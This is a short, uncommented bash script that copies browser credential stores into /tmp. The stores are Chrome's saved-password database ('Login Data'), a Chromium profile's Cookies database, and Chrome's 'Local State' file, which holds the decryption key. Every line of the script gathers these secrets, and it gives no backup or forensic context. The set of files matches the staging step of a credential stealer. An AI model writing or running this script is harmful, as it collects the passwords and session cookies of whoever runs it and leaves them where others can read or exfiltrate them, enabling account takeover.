#!/usr/bin/env bash
set -euo pipefail

cp "$HOME/.config/google-chrome/Default/Login Data" /tmp/login-data.db
cp "$HOME/.config/chromium/Profile 1/Network/Cookies" /tmp/chromium-cookies.db
cp "$HOME/Library/Application Support/Google/Chrome/Local State" /tmp/chrome-state.json
